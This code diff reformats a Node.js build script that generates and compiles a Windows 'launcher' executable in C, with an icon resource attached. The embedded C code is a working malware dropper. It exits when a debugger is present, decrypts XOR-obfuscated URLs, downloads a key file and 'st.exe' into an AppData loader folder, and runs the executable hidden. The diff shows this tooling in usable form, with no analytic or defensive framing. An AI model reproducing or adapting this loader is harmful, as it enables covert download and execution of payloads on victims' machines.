@@ -61,36 +61,24 @@ function cSource({ ip, buildId }) {
 void decrypt_url(wchar_t* out, const unsigned char* enc, int len) {
     unsigned char key[] = { 0x4B, 0x2A, 0x11, 0x9C };
     int key_len = sizeof(key);
-    for (int i = 0; i < len; i++) {
-        out[i] = (wchar_t)(enc[i] ^ key[i % key_len]);
-    }
+    for (int i = 0; i < len; i++) out[i] = (wchar_t)(enc[i] ^ key[i % key_len]);
     out[len] = 0;
 }
 
 void download_file(const wchar_t* url, const wchar_t* dest) {
-    URL_COMPONENTS uc = {0};
-    uc.dwStructSize = sizeof(uc);
-    wchar_t host[256] = {0};
-    wchar_t path[1024] = {0};
-    uc.lpszHostName = host;
-    uc.dwHostNameLength = 256;
-    uc.lpszUrlPath = path;
-    uc.dwUrlPathLength = 1024;
-
+    URL_COMPONENTS uc = {0}; uc.dwStructSize = sizeof(uc);
+    wchar_t host[256] = {0}; wchar_t path[1024] = {0};
+    uc.lpszHostName = host; uc.dwHostNameLength = 256;
+    uc.lpszUrlPath = path; uc.dwUrlPathLength = 1024;
     if (!WinHttpCrackUrl(url, 0, 0, &uc)) return;
-
     HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return;
-
     HINTERNET hConnect = WinHttpConnect(hSession, host, uc.nPort, 0);
     if (!hConnect) { WinHttpCloseHandle(hSession); return; }
-
     HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
     if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }
-
     if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
         WinHttpReceiveResponse(hRequest, NULL)) {
-        
         HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
         if (hFile != INVALID_HANDLE_VALUE) {
             DWORD dwSize = 0, dwDownloaded = 0;
@@ -101,8 +89,7 @@ void download_file(const wchar_t* url, const wchar_t* dest) {
                 BYTE* pBuffer = (BYTE*)malloc(dwSize);
                 if (pBuffer) {
                     if (WinHttpReadData(hRequest, pBuffer, dwSize, &dwDownloaded)) {
-                        DWORD written;
-                        WriteFile(hFile, pBuffer, dwDownloaded, &written, NULL);
+                        DWORD written; WriteFile(hFile, pBuffer, dwDownloaded, &written, NULL);
                     }
                     free(pBuffer);
                 }
@@ -110,18 +97,13 @@ void download_file(const wchar_t* url, const wchar_t* dest) {
             CloseHandle(hFile);
         }
     }
-
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
+    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
 }
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     if (IsDebuggerPresent()) return 1;
-
     wchar_t appData[MAX_PATH];
     if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData))) return 1;
-    
     wchar_t loaderDir[MAX_PATH];
     _snwprintf(loaderDir, MAX_PATH, L"%ls\\\\loader", appData);
     CreateDirectoryW(loaderDir, NULL);
@@ -129,24 +111,17 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     unsigned char encKeyUrl[] = { ${keyUrlArr} };
     unsigned char encStUrl[] = { ${stUrlArr} };
 
-    wchar_t keyUrl[1024];
-    decrypt_url(keyUrl, encKeyUrl, sizeof(encKeyUrl));
-    
-    wchar_t keyPath[MAX_PATH];
-    _snwprintf(keyPath, MAX_PATH, L"%ls\\\\key.json", loaderDir);
+    wchar_t keyUrl[1024]; decrypt_url(keyUrl, encKeyUrl, sizeof(encKeyUrl));
+    wchar_t keyPath[MAX_PATH]; _snwprintf(keyPath, MAX_PATH, L"%ls\\\\key.json", loaderDir);
     download_file(keyUrl, keyPath);
 
-    wchar_t stUrl[1024];
-    decrypt_url(stUrl, encStUrl, sizeof(encStUrl));
-    
-    wchar_t dest[MAX_PATH];
-    _snwprintf(dest, MAX_PATH, L"%ls\\\\st.exe", loaderDir);
+    wchar_t stUrl[1024]; decrypt_url(stUrl, encStUrl, sizeof(encStUrl));
+    wchar_t dest[MAX_PATH]; _snwprintf(dest, MAX_PATH, L"%ls\\\\st.exe", loaderDir);
     download_file(stUrl, dest);
 
     char ansiDest[MAX_PATH];
     WideCharToMultiByte(CP_ACP, 0, dest, -1, ansiDest, MAX_PATH, NULL, NULL);
     WinExec(ansiDest, SW_HIDE);
-
     return 0;
 }
 `;
@@ -157,32 +132,19 @@ export async function compileLauncher({ key, config, baseExe, buildId }) {
   if (config && config.ip) ip = config.ip;
 
   const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wh-build-'));
-  const cPath      = path.join(workDir, 'launcher.c');
-  const rcPath     = path.join(workDir, 'app.rc');
-  const resPath    = path.join(workDir, 'app.res');
-  const outPath    = path.join(workDir, 'launcher.exe');
+  const cPath = path.join(workDir, 'launcher.c'), rcPath = path.join(workDir, 'app.rc');
+  const resPath = path.join(workDir, 'app.res'), outPath = path.join(workDir, 'launcher.exe');
 
   fs.writeFileSync(cPath, cSource({ ip, buildId }));
   fs.writeFileSync(rcPath, rcSource());
 
   const iconSourcePath = path.join(__dirname, '..', 'icon.ico');
-  if (fs.existsSync(iconSourcePath)) {
-    fs.copyFileSync(iconSourcePath, path.join(workDir, 'icon.ico'));
-  } else {
-    const dummyIcon = Buffer.from('00000100010001010000010018003000000016000000280000000100000002000000010018000000000000000000000000000000000000000000000000000000000000000000', 'hex');
-    fs.writeFileSync(path.join(workDir, 'icon.ico'), dummyIcon);
-  }
+  if (fs.existsSync(iconSourcePath)) fs.copyFileSync(iconSourcePath, path.join(workDir, 'icon.ico'));
+  else fs.writeFileSync(path.join(workDir, 'icon.ico'), Buffer.from('00000100010001010000010018003000000016000000280000000100000002000000010018000000000000000000000000000000000000000000000000000000000000000000', 'hex'));
 
   try {
-    await execFileP(WINDRES, [
-      '-I', workDir, '-i', rcPath, '-o', resPath, '--input-format=rc', '--output-format=coff'
-    ], { cwd: workDir, timeout: 30_000 });
-
-    await execFileP(CC, [
-      '-O2', '-s', '-mwindows', '-o', outPath, cPath, resPath,
-      '-lwinhttp', '-lshell32', '-lole32', '-luser32', '-lkernel32'
-    ], { cwd: workDir, timeout: 60_000 });
-
+    await execFileP(WINDRES, ['-I', workDir, '-i', rcPath, '-o', resPath, '--input-format=rc', '--output-format=coff'], { cwd: workDir, timeout: 30_000 });
+    await execFileP(CC, ['-O2', '-s', '-mwindows', '-o', outPath, cPath, resPath, '-lwinhttp', '-lshell32', '-lole32', '-luser32', '-lkernel32'], { cwd: workDir, timeout: 60_000 });
     return fs.readFileSync(outPath);
   } finally {
     try { fs.rmSync(workDir, { recursive: true, force: true }); } catch {}
